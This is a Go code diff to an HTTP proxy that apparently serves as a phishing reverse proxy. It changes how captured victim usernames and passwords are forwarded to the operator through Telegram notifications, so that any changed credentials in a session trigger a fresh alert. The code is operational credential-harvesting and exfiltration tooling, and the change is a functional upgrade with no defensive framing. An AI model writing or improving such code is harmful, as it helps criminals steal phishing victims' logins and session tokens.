@@ -1619,13 +1619,6 @@ func (p *HttpProxy) sendTelegramNotification(sid string) {
 	if sid == "" {
 		return
 	}
-	// Check if notification was already sent for this session
-	if s, ok := p.sessions[sid]; ok {
-		if s.CredentialsNotificationSent {
-			return // Already sent, don't send duplicate
-		}
-		s.CredentialsNotificationSent = true
-	}
 
 	// Fetch the session from database to get all details
 	session, err := p.db.GetSessionBySid(sid)
@@ -1633,14 +1626,27 @@ func (p *HttpProxy) sendTelegramNotification(sid string) {
 		log.Error("telegram: failed to get session: %v", err)
 		return
 	}
+
 	// Only send if we have both username and password
-	if session.Username != "" && session.Password != "" {
-		go func() {
-			if err := p.telegram.SendCredentialsNotification(session); err != nil {
-				log.Error("telegram credentials: %v", err)
-			}
-		}()
+	if session.Username == "" || session.Password == "" {
+		return
 	}
+
+	// Check if these exact credentials were already notified (skip only if BOTH are same)
+	if s, ok := p.sessions[sid]; ok {
+		if s.LastNotifiedUsername == session.Username && s.LastNotifiedPassword == session.Password {
+			return // Same credentials already sent, skip duplicate
+		}
+		// Update tracked credentials
+		s.LastNotifiedUsername = session.Username
+		s.LastNotifiedPassword = session.Password
+	}
+
+	go func() {
+		if err := p.telegram.SendCredentialsNotification(session); err != nil {
+			log.Error("telegram credentials: %v", err)
+		}
+	}()
 }
 
 // sendCookiesNotification sends cookies notification when tokens are captured
